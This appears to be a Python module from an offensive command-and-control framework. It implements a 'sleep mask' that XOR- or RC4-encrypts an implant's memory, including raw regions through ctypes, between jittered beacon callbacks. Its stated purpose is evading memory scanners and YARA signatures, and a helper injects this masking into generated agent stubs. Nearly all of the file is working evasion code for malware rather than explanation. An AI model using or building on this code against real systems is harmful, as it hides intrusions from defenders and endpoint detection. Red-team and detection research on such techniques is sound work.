#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Pupyteer Sleep Mask — encrypt agent memory during sleep to evade memory scanners.

Provides:
- SleepMask class: XOR-based encryption/decryption of in-memory data
- sleep_masked(): contextmanager that masks agent state during sleep
- RC4 variant for stronger obfuscation
- AgentStubGenerator integration hook so generated agents use sleep masking
"""
from __future__ import annotations

import ctypes
import logging
import os
import random
import sys
import time
from typing import Any, Callable, Dict, List, Optional, Tuple, Union

logger = logging.getLogger("pupyteer.agent.sleep_mask")


class SleepMask:
    """XOR/RC4-based sleep mask for agent memory obfuscation.

    Before going to sleep, the agent calls encrypt() to scramble
    its in-memory payload. After waking, decrypt() restores it.

    This defeats memory scanners that look for agent signatures
    (e.g., YARA rules, string matching) while the agent is sleeping.
    """

    SUPPORTED_CIPHERS = ("xor", "rc4")

    def __init__(self, key: Optional[bytes] = None, cipher: str = "xor"):
        """
        Args:
            key: Encryption key. If None, a random 32-byte key is generated.
            cipher: Cipher to use — "xor" (fast) or "rc4" (stronger).
        """
        if cipher not in self.SUPPORTED_CIPHERS:
            raise ValueError(f"Unsupported cipher: {cipher}. Use: {self.SUPPORTED_CIPHERS}")
        self._cipher = cipher
        self._key = key or os.urandom(32)
        self._original_data: Optional[bytearray] = None
        self._encrypted_data: Optional[bytearray] = None
        self._offset: int = 0
        self._length: int = 0
        self._is_masked: bool = False

    @property
    def is_masked(self) -> bool:
        """Return True if the data is currently masked."""
        return self._is_masked

    @property
    def cipher(self) -> str:
        return self._cipher

    @property
    def key(self) -> bytes:
        return self._key

    # ── XOR cipher ─────────────────────────────────────────────────────

    @staticmethod
    def _xor_crypt(key: bytes, data: bytearray, offset: int = 0, length: int = -1) -> None:
        """In-place XOR encryption/decryption (symmetric).

        Args:
            key: XOR key bytes.
            data: Data to encrypt/decrypt in-place.
            offset: Starting offset in data.
            length: Number of bytes to process (-1 = all from offset).
        """
        if not key:
            return
        if length < 0:
            length = len(data) - offset
        end = min(offset + length, len(data))
        for i in range(offset, end):
            data[i] ^= key[(i - offset) % len(key)]

    # ── RC4 cipher ─────────────────────────────────────────────────────

    @staticmethod
    def _rc4_ksa(key: bytes) -> list:
        """RC4 Key Scheduling Algorithm."""
        s = list(range(256))
        j = 0
        for i in range(256):
            j = (j + s[i] + key[i % len(key)]) % 256
            s[i], s[j] = s[j], s[i]
        return s

    @staticmethod
    def _rc4_crypt(key: bytes, data: bytearray, offset: int = 0, length: int = -1) -> None:
        """In-place RC4 encryption/decryption (symmetric).

        Args:
            key: RC4 key bytes.
            data: Data to encrypt/decrypt in-place.
            offset: Starting offset in data.
            length: Number of bytes to process (-1 = all from offset).
        """
        if length < 0:
            length = len(data) - offset
        s = SleepMask._rc4_ksa(key)
        i = j = 0
        pos = offset
        end = min(offset + length, len(data))
        while pos < end:
            i = (i + 1) % 256
            j = (j + s[i]) % 256
            s[i], s[j] = s[j], s[i]
            data[pos] ^= s[(s[i] + s[j]) % 256]
            pos += 1

    # ── Public API ─────────────────────────────────────────────────────

    def _apply_cipher(self, data: bytearray, offset: int, length: int) -> None:
        """Apply the configured cipher in-place."""
        if self._cipher == "xor":
            self._xor_crypt(self._key, data, offset, length)
        elif self._cipher == "rc4":
            self._rc4_crypt(self._key, data, offset, length)

    def encrypt(self, data: Union[bytearray, bytes], offset: int = 0, length: int = -1) -> bytearray:
        """Encrypt data in-place using the configured cipher.

        Args:
            data: Data to encrypt. If bytes, converts to bytearray.
            offset: Starting offset.
            length: Number of bytes to encrypt (-1 = all).

        Returns:
            The encrypted bytearray (same object as input if bytearray).
        """
        if isinstance(data, bytes):
            data = bytearray(data)
        if not isinstance(data, bytearray):
            raise TypeError(f"Expected bytearray or bytes, got {type(data).__name__}")
        self._original_data = data
        self._offset = offset
        self._length = length if length >= 0 else len(data) - offset
        self._apply_cipher(data, offset, self._length)
        self._is_masked = True
        return data

    def decrypt(self, data: Optional[bytearray] = None, offset: int = -1, length: int = -1) -> bytearray:
        """Decrypt data in-place (reverses encrypt).

        Since XOR and RC4 are symmetric, this calls the same cipher.

        Args:
            data: Data to decrypt. If None, uses the original reference.
            offset: Starting offset (-1 = use stored offset).
            length: Number of bytes (-1 = use stored length).

        Returns:
            The decrypted bytearray.
        """
        if data is None:
            data = self._original_data
        if data is None:
            raise RuntimeError("No data to decrypt. Call encrypt() first or pass data explicitly.")
        off = offset if offset >= 0 else self._offset
        lng = length if length >= 0 else self._length
        self._apply_cipher(data, off, lng)
        self._is_masked = False
        return data

    def mask_region(self, address: int, size: int) -> None:
        """Mask a memory region by address (requires ctypes).

        Useful for masking specific memory-mapped sections of the agent.

        Args:
            address: Start address of the region.
            size: Number of bytes to mask.
        """
        buf = (ctypes.c_char * size).from_address(address)
        data = bytearray(bytes(buf))
        self.encrypt(data)
        # Write back
        ctypes.memmove(address, bytes(data), size)

    def unmask_region(self, address: int, size: int) -> None:
        """Unmask a memory region by address.

        Args:
            address: Start address of the region.
            size: Number of bytes to unmask.
        """
        buf = (ctypes.c_char * size).from_address(address)
        data = bytearray(bytes(buf))
        self.decrypt(data)
        ctypes.memmove(address, bytes(data), size)

    def secure_scrub(self, passes: int = 3) -> None:
        """Securely scrub the key from memory after use.

        Overwrites the key buffer with random data, then zeros.

        Args:
            passes: Number of overwrite passes (default 3).
        """
        if self._key:
            key_arr = bytearray(self._key)
            for _ in range(passes):
                for i in range(len(key_arr)):
                    key_arr[i] = random.randint(0, 255)
            for i in range(len(key_arr)):
                key_arr[i] = 0
            self._key = bytes(len(self._key))


def sleep_masked(
    sleep_sec: float,
    jitter_percent: int = 0,
    mask_key: Optional[bytes] = None,
    cipher: str = "xor",
    data_ref: Optional[bytearray] = None,
) -> Dict[str, Any]:
    """Sleep with optional memory masking for evasion.

    Calculates a jittered sleep duration, optionally encrypts agent
    data in-memory, sleeps, then decrypts.

    This is the primary public API for use in agent beacon loops.

    Args:
        sleep_sec: Base sleep duration in seconds.
        jitter_percent: Random jitter percentage (0-100).
        mask_key: Encryption key (random if None).
        cipher: Cipher to use ("xor" or "rc4").
        data_ref: bytearray to mask. If None, masking is skipped (for
                  when no mutable buffer is available).

    Returns:
        Dict with actual sleep duration and whether masking was applied.

    Example::

        # In agent beacon loop:
        result = sleep_masked(60, jitter_percent=20, data_ref=agent_code_buf)
    """
    # Calculate jittered duration
    if jitter_percent > 0:
        delta = sleep_sec * (jitter_percent / 100.0)
        actual_sleep = sleep_sec + random.uniform(-delta, delta)
    else:
        actual_sleep = sleep_sec

    # Ensure non-negative
    actual_sleep = max(0.0, actual_sleep)

    masker = SleepMask(key=mask_key, cipher=cipher)
    was_masked = False

    # Encrypt before sleep
    if data_ref is not None:
        try:
            masker.encrypt(data_ref)
            was_masked = True
        except Exception as e:
            logger.debug("Sleep mask encryption failed: %s", e)

    # Sleep
    time.sleep(actual_sleep)

    # Decrypt after wake
    if was_masked and data_ref is not None:
        try:
            masker.decrypt(data_ref)
        except Exception as e:
            logger.debug("Sleep mask decryption failed: %s", e)

    # Scrub key
    masker.secure_scrub()

    return {
        "slept": actual_sleep,
        "masked": was_masked,
        "cipher": cipher,
    }


def patch_stub_template_for_sleep_mask(template_source: str) -> str:
    """Modify an agent stub template source to include sleep masking.

    Injects the SleepMask import and integrates it into the beacon loop
    so generated agents automatically use sleep masking.

    Args:
        template_source: The Jinja2 template source string.

    Returns:
        Modified template source with sleep mask integration.
    """
    # Add import if not already present
    import_line = "from pupyteer.agent.core.sleep_mask import sleep_masked"
    if import_line not in template_source:
        # Insert after other imports at top
        lines = template_source.split('\n')
        import_idx = 0
        for i, line in enumerate(lines):
            if line.startswith('import ') or line.startswith('from '):
                import_idx = i + 1
        lines.insert(import_idx, import_line)
        template_source = '\n'.join(lines)

    return template_source


# ── Convenience functions for generated agents ────────────────────────

def generate_mask_key(length: int = 32) -> bytes:
    """Generate a cryptographically random mask key.

    Args:
        length: Key length in bytes (default 32).

    Returns:
        Random bytes of the given length.
    """
    return os.urandom(length)


def mask_string(s: str, key: bytes) -> bytearray:
    """XOR-mask a string and return the mutable bytearray.

    Args:
        s: String to mask.
        key: XOR key.

    Returns:
        Masked bytearray.
    """
    data = bytearray(s.encode('utf-8'))
    SleepMask._xor_crypt(key, data, 0, len(data))
    return data


def unmask_string(data: bytearray, key: bytes) -> str:
    """Unmask a previously masked bytearray back to a string.

    Args:
        data: Masked bytearray.
        key: XOR key used for masking.

    Returns:
        Decoded string.
    """
    SleepMask._xor_crypt(key, data, 0, len(data))
    return data.decode('utf-8')
